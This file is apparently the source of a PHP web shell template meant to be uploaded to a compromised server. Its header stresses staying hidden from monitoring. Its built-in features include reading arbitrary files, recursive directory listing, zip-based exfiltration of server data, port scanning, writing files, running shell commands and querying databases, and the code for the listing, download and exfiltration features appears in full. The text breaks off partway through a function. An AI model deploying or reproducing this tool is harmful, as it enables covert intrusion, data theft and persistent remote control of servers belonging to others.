<?php
/*
 * Version: 1.0.0
 * Build: 2024-04-13
 * Last change: 2024-05-01
 * Author: @Ebalo <https://github.com/ebalo55>
 * Minimum PHP version: 7.0
 * Description:
 * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
 * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
 * Everything should be as stealthy as possible, meaning that the operations should not be visible to the user or any
 * monitoring system without rising any uncommon process tree nor disk operation.
 * The possibility to get discovered always exists, but the goal is to make it as hard as possible.
 */
error_reporting(0);
session_start();

// Features name constants
$LOGIN                   = "__FEAT_LOGIN__";
$FILE_EXTRACTION         = "__FEAT_FILE_EXTRACTION__";
$FILE_EXTRACTION_PREVIEW = "__FEAT_FILE_EXTRACTION_PREVIEW__";
$DIRECTORY_LISTING       = "__FEAT_DIRECTORY_LISTING__";
$EXFILTRATE              = "__FEAT_EXFILTRATE__";
$PORT_SCAN               = "__FEAT_PORT_SCAN__";
$WRITE_FILE              = "__FEAT_WRITE_FILE__";
$RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
$PHP_INFO                = "__FEAT_PHP_INFO__";
$QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";

$USERNAME = "__USERNAME__";
$PASSWORD = "__PASSWORD__";
$SALT     = "__SALT__";

/**
 * Define the enabled features
 *
 * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
 */
$ENABLED_FEATURES = [
    $FILE_EXTRACTION         => [
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
    ],
    $FILE_EXTRACTION_PREVIEW => [
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "hidden"      => true,
    ],
    $DIRECTORY_LISTING       => [
        "title"       => "Directory listing",
        "description" => "List all files and folders in a directory and optionally its subdirectories.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
</svg>',
    ],
    $EXFILTRATE              => [
        "title"       => "Exfiltrate",
        "description" => "Exfiltrate data from the server in a password protected zip archive.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
</svg>',
    ],
    $PORT_SCAN               => [
        "title"       => "Port scan",
        "description" => "Scan a given range of TCP ports using connect method.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
</svg>',
    ],
    $WRITE_FILE              => [
        "title"       => "Write file",
        "description" => "Write a file to the given path, writing permission are required.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
    ],
    $RUN_COMMAND             => [
        "title"       => "Run command",
        "description" => "Run a system command using the default shell.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
</svg>',
    ],
    $PHP_INFO                => [
        "title"       => "PHP Info",
        "description" => "Display PHP information.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
</svg>',
    ],
    $QUERY_DATABASES         => [
        "title"       => "Query databases",
        "description" => "Query databases using the provided credentials.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
</svg>',
    ],
];

date_default_timezone_set("UTC");

$CSS = '__CSS__';

////////////////////////
/// UTILITY FUNCTIONS //
////////////////////////

// Fix for PHP < 5.5
if (!function_exists("array_column")) {
    function array_column($array, $column_name) {
        return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
    }
}

/**
 * Check if the request method is POST
 *
 * @return bool
 */
function isPost() {
    return $_SERVER['REQUEST_METHOD'] === 'POST';
}

/**
 * Check if the checkbox is active
 *
 * @param $name string Name of the checkbox
 *
 * @return bool
 */
function isCheckboxActive($name) {
    return isset($_POST[$name]) && $_POST[$name] === "y";
}

///////////////////////
/// RENDERING BLOCK ///
///////////////////////

/**
 * Returns the classes to apply to the navigation item highlighted because it's the current page
 *
 * @param $current_page string Current page
 * @param $checking_page string Page to check if it's the current page
 *
 * @return string
 */
function htmlHighlightActivePage($current_page, $checking_page) {
    if ($current_page === $checking_page) {
        return "bg-zinc-800 text-white";
    }
    return "text-zinc-400";
}

/**
 * Create a navigation link
 *
 * @param $page string Page to link to
 * @param $current_page string Current page to highlight
 * @param $definition array{title: string, description: string, svg: string, hidden?: bool} Label to display
 *
 * @return string
 */
function makeNavLink($page, $current_page, $definition) {
    if ($definition["hidden"]) {
        return "";
    }

    ob_start();
    ?>
    <li>
        <a href="?page=<?php echo $page ?>"
           class="flex gap-x-3 rounded p-2 text-sm font-semibold leading-6
           <?php echo htmlHighlightActivePage($current_page, $page) ?>
           "
           id="nav-<?php echo $page ?>"
        >
            <div class="flex items-center justify-center">
                <?php echo $definition["svg"]; ?>
            </div>
            <?php echo $definition["title"] ?>
        </a>
    </li>
    <?php
    return ob_get_clean();
}

/**
 * Create a page header
 *
 * @param $title string Title of the page
 * @param $description string Description of the page
 *
 * @return string
 */
function makePageHeader($title, $description) {
    ob_start();
    ?>
    <div class="lg:flex lg:items-center lg:justify-between">
        <div class="min-w-0 flex-1">
            <h2 class="text-2xl font-bold leading-7 text-zinc-900 sm:truncate sm:text-3xl sm:tracking-tight">
                <?php echo $title ?>
            </h2>
            <div class="mt-1 flex flex-col sm:mt-0 sm:flex-row sm:flex-wrap sm:space-x-6">
                <div class="mt-2 flex items-center text-sm text-zinc-500">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                         stroke-width="1.5" stroke="currentColor"
                         class="mr-1.5 h-5 w-5 flex-shrink-0 text-zinc-400">
                        <path stroke-linecap="round" stroke-linejoin="round"
                              d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z"/>
                    </svg>
                    <?php echo $description ?>
                </div>
            </div>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create an input field
 *
 * @param $type string Type of the input
 * @param $label string Label for the input
 * @param $name string Name of the input
 * @param $placeholder string Placeholder for the input
 * @param $description string Description of the input
 * @param $required bool Whether is the input required
 *
 * @return string
 */
function makeInput($type, $label, $name, $placeholder, $description, $required = false, $query_param = null) {
    ob_start();
    if ($type !== "textarea") {
        ?>
        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
            <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?php echo $label ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <input type="<?php echo $type ?>"
                   id="<?php echo $name ?>"
                   name="<?php echo $name ?>"
                   placeholder="<?php echo $placeholder ?>"
                <?php
                if ($required) {
                    echo "required ";
                }
                if ($query_param !== null) {
                    echo "value=\"" . $_GET[$query_param] . "\" ";
                }
                ?>
                   class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
            <p class="text-sm text-zinc-500">
                <?php echo $description ?>
            </p>
        </div>
        <?php
    }
    else {
        ?>
        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
            <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?php echo $label ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <textarea id="<?php echo $name ?>"
                      name="<?php echo $name ?>"
                      placeholder="<?php echo $placeholder ?>"
                <?php
                if ($required) {
                    echo "required";
                }
                ?>
                      class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400"
                      rows="5"
            ></textarea>
            <p class="text-sm text-zinc-500">
                <?php echo $description ?>
            </p>
        </div>
        <?php
    }
    return ob_get_clean();
}

/**
 * Create a select field
 *
 * @param $label string Label for the select
 * @param $name string Name of the select
 * @param $options array<{label: string, value: string, disabled?: bool, selected?: bool}> Options for the select
 * @param $required bool Whether the select is required
 * @param $disable_reason string|null Reason for the option to be disabled, if any
 *
 * @return string
 */
function makeSelect($label, $name, $options, $required = false, $disable_reason = null) {
    ob_start();
    ?>
    <div id="<?php echo $name ?>-container">
        <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-gray-900">
            <?php echo $label ?>
            <?php
            if ($required) {
                echo "<sup class='text-red-500'>*</sup>";
            }
            ?>
        </label>
        <select id="<?php echo $name ?>" name="<?php echo $name ?>"
                class="mt-2 block w-full rounded-md border-0 py-1.5 pl-3 pr-10 text-gray-900 ring-1 ring-inset
                ring-gray-300 focus:ring-2 focus:ring-indigo-600 sm:text-sm sm:leading-6"
            <?php
            if ($required) {
                echo "required ";
            }
            ?>
        >
            <?php
            foreach ($options as $option) {
                echo "<option value='" .
                     $option["value"] .
                     "' " .
                     ($option["disabled"] ? "disabled" : "") .
                     ($option["selected"] ? "selected" : "") .
                     ">" .
                     $option["label"] .
                     ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
                     "</option>";
            }
            ?>
        </select>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a checkbox field
 *
 * @param $name string Name of the checkbox
 * @param $label string Label for the checkbox
 * @param $description string Description of the checkbox
 * @param $is_checked bool Whether the checkbox is checked
 * @param $value string Value of the checkbox, default is "y"
 * @param $onclick string OnClick event for the checkbox
 *
 * @return string
 */
function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
    ob_start();
    ?>
    <div class="relative flex items-start" id="<?php echo $name ?>-container">
        <div class="flex h-6 items-center">
            <input id="<?php echo $name ?>" name="<?php echo $name ?>" type="checkbox"
                   class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
                   value="<?php echo $value ?>"
                <?php
                if ($is_checked) {
                    echo "checked ";
                }
                if ($onclick !== null) {
                    echo "onclick=\"$onclick\" ";
                }
                ?>
            >
        </div>
        <div class="ml-3 text-sm leading-6 flex flex-col select-none">
            <label for="<?php echo $name ?>" class="font-medium text-zinc-900 w-full cursor-pointer">
                <?php echo $label ?>
            </label>
            <p class="text-zinc-500 cursor-pointer" onclick="document.getElementById('<?php echo $name ?>').click()">
                <?php echo $description ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a form with the given elements
 *
 * @param $operation string Operation to perform when the form is submitted
 * @param $action string Action to perform when the form is submitted
 * @param $elements string[] Elements to include in the form
 * @param $method string Method to use for the form, default is "post"
 *
 * @return string
 */
function makeForm($operation, $action, $elements, $method = "post") {
    ob_start();
    ?>
    <form action="<?php echo $action ?>" method="<?php echo $method ?>" class="flex flex-col gap-y-6 max-w-xl mt-8">
        <input type="hidden" name="__OPERATION__" value="<?php echo $operation ?>"/>
        <?php
        foreach ($elements as $element) {
            echo $element;
        }
        ?>
        <button type="submit"
                class="rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
    hover:bg-zinc-700 transition-all duration-300">
            Run operation
        </button>
    </form>
    <?php
    return ob_get_clean();
}

/**
 * Create a page with the given elements
 *
 * @param $elements string[] Elements to include in the page
 * @param $current_page string Current page to highlight in the navigation
 *
 * @return string
 */
function makePage($elements, $current_page) {
    global $ENABLED_FEATURES, $CSS, $LOGIN;
    if ($_SESSION["auth"] !== true) {
        header("Location: ?page=" . $LOGIN);
        die();
    }

    ob_start();
    ?>
    <html lang="en">
    <head>
        <title>__TITLE__</title>
        <style><?php echo $CSS ?></style>
        <link rel="stylesheet" href="compiled.css">
        <script>__JS__</script>
    </head>
    <body class="bg-white">
    <div class="fixed inset-y-0 z-50 w-72 flex flex-col">
        <div class="flex flex-grow flex-col gap-y-5 overflow-y-auto bg-zinc-900 px-6 pb-4">
            <div class="flex items-center h-16 shrink-0">
                <h1 class="text-2xl text-white">__TITLE__</h1>
            </div>
            <nav class="flex flex-1 flex-col">
                <ul role="list" class="flex flex-1 flex-col gap-y-7">
                    <li>
                        <ul role="list" class="-mx-2">
                            <?php
                            foreach ($ENABLED_FEATURES as $feature => $definition) {
                                echo makeNavLink($feature, $current_page, $definition);
                            }
                            ?>
                        </ul>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
    <div class="ml-72">
        <main class="py-10">
            <div class="container px-16">
                <?php
                foreach ($elements as $element) {
                    echo $element;
                }
                ?>
            </div>
        </main>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a login page
 *
 * @return string
 */
function makeLoginPage() {
    global $CSS, $LOGIN;
    ob_start();
    ?>
    <html lang="en" class="h-full bg-zinc-900">
    <head>
        <title>__TITLE__</title>
        <style><?php echo $CSS ?></style>
        <link rel="stylesheet" href="compiled.css">
        <script>__JS__</script>
    </head>
    <body class="h-full">
    <div class="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
        <div class="sm:mx-auto sm:w-full sm:max-w-sm">
            <h2 class="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-white">
                Sign in to your account
            </h2>
        </div>

        <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
            <form class="space-y-6" action="<?php echo $_SERVER["REQUEST_URI"]; ?>" method="post">
                <input type="hidden" name="__OPERATION__" value="<?php echo $LOGIN ?>"/>
                <div>
                    <label for="__PARAM_1__" class="block text-sm font-medium leading-6 text-white">
                        Username
                    </label>
                    <div class="mt-2">
                        <input id="__PARAM_1__" name="__PARAM_1__" type="text" autocomplete="__PARAM_1__" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="admin"
                        >
                    </div>
                </div>

                <div>
                    <div class="flex items-center justify-between">
                        <label for="__PARAM_2__" class="block text-sm font-medium leading-6 text-white">
                            Password
                        </label>
                    </div>
                    <div class="mt-2">
                        <input id="__PARAM_2__" name="__PARAM_2__" type="password" autocomplete="__PARAM_2__" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;"
                        >
                    </div>
                </div>

                <div>
                    <button type="submit"
                            class="flex w-full justify-center rounded-md bg-indigo-500 px-3 py-1.5 text-sm
                            font-semibold leading-6 text-white shadow-sm hover:bg-indigo-400 focus-visible:outline
                            focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-500">
                        Sign in
                    </button>
                </div>
            </form>
        </div>
    </div>
    </body>
    </html>
    <?php
    return ob_get_clean();
}

/**
 * Create a code highlight element
 *
 * @param $code string|int|float Code to highlight
 *
 * @return string
 */
function makeCodeHighlight($code) {
    ob_start();
    ?>
    <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
    <?php
    return ob_get_clean();
}

/**
 * Create an alert element on the page
 *
 * @param $title string Title of the alert box
 * @param $message string Message of the alert
 *
 * @return string
 */
function makeAlert($title, $message) {
    ob_start();
    ?>
    <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
        <div class="flex items-start justify-center text-yellow-600">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
                 stroke="currentColor" class="w-8 h-8">
                <path stroke-linecap="round" stroke-linejoin="round"
                      d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z"/>
            </svg>
        </div>
        <div class="flex flex-col">
            <h3 class="text-sm leading-7 font-semibold">
                <?php echo $title; ?>
            </h3>
            <p class="text-sm">
                <?php echo $message; ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Open the command output screen where output can be freely written
 *
 * @param string $title Title of the command output screen
 *
 * @return void
 */
function openCommandOutputScreen($classes = "", $title = "Command output", $no_margin = false, $no_padding = false)
{
    ?>
<div class="<?php
echo $no_margin ? "" : "ml-72 ";
echo $no_padding ? "" : "py-10 ";
?>">
    <div class="container px-16">
    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-3">
    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-8">
        <?php echo $title ?>
    </h3>
    <pre class="p-2 mt-2 <?php echo $classes ?>"><?php
}

/**
 * Closes the command output screen
 *
 * @return void
 */
function closeCommandOutputScreen() {
    ?></pre>
    </div>
    </div>
    </div>
    <?php
}

/**
 * Output data to the command output screen
 *
 * @param string|array $data Data to output
 *
 * @return void
 */
function out($data) {
    if (is_array($data)) {
        $data = implode("\n", $data);
    }
    echo "$data\n";
    flush();
}

///////////////////////
// CODE BLOCK START  //
///////////////////////

/**
 * Download a file in chunks
 *
 * @param $filepath string Path to the file to download
 * @param $filesize int Size of the file
 * @param $filename string Name of the file to download or null to use the original filename
 *
 * @return void
 */
function chunkedDownload($filepath, $filesize, $filename = null) {
    $chunk_size = 4096; // Adjust chunk size as needed

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream'); // Adjust content type if needed
    header(
        'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"',
    );
    header('Content-Transfer-Encoding: chunked');
    header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking

    $file_handle = fopen($filepath, 'rb');

    while (!feof($file_handle)) {
        $chunk = fread($file_handle, $chunk_size);
        echo $chunk;
        flush();     // Flush output buffer after sending each chunk
    }

    fclose($file_handle);
}

/**
 * Handle the file extraction operation
 *
 * @return void
 */
function handleFileExtraction() {
    $filepath = $_POST['__PARAM_1__'];
    $preview  = strtolower($_POST['__PARAM_2__']) === "y";
    $export   = strtolower($_POST['__PARAM_3__']) === "y";

    if (!file_exists($filepath)) {
        echo "Error: File '$filepath' does not exist.\n";
        return;
    }

    $filesize = filesize($filepath);

    echo "Reading file '$filepath'\n";
    echo "File size: " . formatBytes($filesize) . "\n";
    if ($preview) {
        $preview_content = fopen($filepath, "r");
        $read            = fread($preview_content, 10240); // Read 10Kb
        fclose($preview_content);
        echo "Preview:\n" . htmlspecialchars($read, ENT_QUOTES, "UTF-8") . "\n";

        return;
    }

    if ($filesize < 102400) { // Less than 100Kb
        chunkedDownload($filepath, $filesize);
    }
    elseif ($export) {
        chunkedDownload($filepath, $filesize);
    }
}

/**
 * Handle the directory listing operation
 *
 * @return void
 */
function handleDirectoryListing() {
    $path      = $_POST['__PARAM_1__'];
    $max_depth = $_POST['__PARAM_2__'];

    listFilesRecursive($path, $max_depth);
}

/**
 * List files recursively
 *
 * @param $path string Path to list
 * @param $max_depth int Maximum depth to list
 * @param $depth int Current depth
 * @param $show_line_split bool Whether to show a line split between entries
 *
 * @return void
 */
function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true) {
    if (is_string($max_depth) && strtolower($max_depth) === "inf") {
        $max_depth = INF;
    }

    // Get stat for current path
    getStatForCurrentPath($path);

    if ($show_line_split) {
        echo "----------------\n";
    }

    // Check if path is a directory and is readable
    if (is_dir($path) && is_readable($path)) {
        // Open directory handle
        $dir_handle = opendir($path);
        // Loop through directory contents
        while (($file = readdir($dir_handle)) !== false) {
            // Ignore '.' and '..'
            if ($file !== '.' && $file !== '..') {
                $sub_path = "$path/$file";
                // Recursively list files if depth is less than max depth
                if ($depth < $max_depth) {
                    listFilesRecursive($sub_path, $max_depth, $depth + 1, false);
                }
                else {
                    // Print information for files beyond max depth
                    getStatForCurrentPath($sub_path);
                }
            }
        }
        // Close directory handle
        closedir($dir_handle);
    }
}

/**
 * Get the stat for the current path and print information
 *
 * @param $path string Path to get stat for
 *
 * @return array
 */
function getStatForCurrentPath($path) {
    $stat = stat($path);

    // Print information for current path
    $perm = getPermissionsString($path);
    echo "$perm " .
         pad_right("" . $stat["nlink"], 3) .
         " " .
         pad_right("" . $stat["uid"], 5) .
         " " .
         pad_right("" . $stat["gid"], 5) .
         " " .
         formatBytes($stat["size"]) .
         " " .
         convertUnixTimestampToDate($stat["mtime"]) .
         " $path\n";

    return [$stat, $perm];
}

/**
 * Get the permissions string for a file or directory (unix like `ls -l` output)
 *
 * @param $path
 *
 * @return string
 */
function getPermissionsString($path) {
    if (!file_exists($path)) {
        return "----------";
    }

    $perms = fileperms($path);

    // Determine file type
    $type = '';
    if (is_dir($path)) {
        $type = 'd';
    }
    elseif (is_file($path)) {
        $type = '-';
    }

    // Owner permissions
    $owner_perms = ($perms & 0x0100) ? 'r' : '-';
    $owner_perms .= ($perms & 0x0080) ? 'w' : '-';
    $owner_perms .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');

    // Group permissions
    $group_perms = ($perms & 0x0020) ? 'r' : '-';
    $group_perms .= ($perms & 0x0010) ? 'w' : '-';
    $group_perms .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');

    // Other permissions
    $other_perms = ($perms & 0x0004) ? 'r' : '-';
    $other_perms .= ($perms & 0x0002) ? 'w' : '-';
    $other_perms .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');

    return $type . $owner_perms . $group_perms . $other_perms;
}

/**
 * Pad a string to the left with spaces
 *
 * @param $str
 * @param $pad_length
 *
 * @return mixed|string
 */
function pad_right($str, $pad_length = 10) {
    // Ensure string and pad length are valid
    if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
        return $str; // Return unmodified string for invalid input
    }

    // Pad the string with spaces using str_pad
    return str_pad($str, $pad_length);
}

/**
 * Format bytes to human readable format
 *
 * @param $bytes
 *
 * @return string
 */
function formatBytes($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];

    $bytes = max($bytes, 0);
    $pow   = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow   = min($pow, count($units) - 1);

    // Calculate size in the chosen unit
    $bytes /= 1024 ** $pow;

    // Format with three-point precision
    return pad_right(round($bytes, 3) . ' ' . $units[$pow]);
}

/**
 * Convert a Unix timestamp to a date string
 *
 * @param $timestamp
 *
 * @return false|string
 */
function convertUnixTimestampToDate($timestamp) {
    return date('Y-m-d H:i:s', $timestamp);
}

/**
 * Get the shortest common path from a list of paths
 *
 * @param $paths
 *
 * @return string|null
 */
function getShortestCommonPath($paths) {
    if (empty($paths)) {
        return null;
    }

    $shortest_path = $paths[0]; // Initialize with first path

    foreach ($paths as $path) {
        $common_path       = '';
        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
        $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));

        $min_length = min(count($path_segments), count($shortest_segments));
        for ($i = 0; $i < $min_length; $i++) {
            if ($path_segments[$i] === $shortest_segments[$i]) {
                $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
            }
            else {
                break;
            }
        }

        $shortest_path = $common_path; // Update shortest path if shorter common path found
    }

    return rtrim($shortest_path, DIRECTORY_SEPARATOR); // Remove trailing separator if present
}

/**
 * Handle the zip creation process
 *
 * @return void
 */
function handleCreateZip() {
    $content = $_POST['__PARAM_1__'];

    if (!extension_loaded('zip')) {
        echo makeExfiltratePage();
        openCommandOutputScreen();
        echo "Error: Zip extension is not loaded.\n";
        closeCommandOutputScreen();
        return;
    }

    $zip      = new ZipArchive();
    $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");

    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        echo makeExfiltratePage();
        openCommandOutputScreen();
        echo "Error: Could not create temporary archive.\n";
        closeCommandOutputScreen();
        return;
    }

    $lines            = explode("\n", $content);
    $path_replacement = getShortestCommonPath($lines);
    foreach ($lines as $line) {
        $parts = explode(',', trim($line)); // Split line by comma
        $path  = $parts[0] ?? '';

        $recursive  = in_array('with_tree', $parts);
        $extensions = [];

        foreach ($parts as $part) {
            if (strpos($part, 'extension=') === 0) {
                $extensions = explode("|", strtolower(trim(substr($part, 10))));
                break;
            }
        }

        if ($path) {
            if (
                is_file($path) &&
                ($extensions === [] || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
            ) {
                $zip->addFile(
                    $path,
                    str_replace(
                        $path_replacement,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($path),
                        ),  // Replace backslashes with forward slashes
                    ), // Remove common path from filename
                );
            }
            else {
                if (is_dir($path) && is_readable($path)) {
                    addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
                }
            }
        }
    }

    $zip->close();

    $file_size = filesize($zip_name);
    chunkedDownload($zip_name, $file_size, "export.zip");
    unlink($zip_name); // Delete temporary zip file;
}

/**
 * Add a directory to a zip archive
 *
 * @param $dir string Directory to add
 * @param $zip ZipArchive Zip archive to add to
 * @param $recursive bool Whether to add the directory recursively
 * @param $extensions string[] Extensions to include
 * @param $cleanup_path string Path to cleanup
 *
 * @return void
 */
function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "") {
    $dir_handle = opendir($dir);

    while (($file = readdir($dir_handle)) !== false) {
        if ($file !== '.' && $file !== '..') {
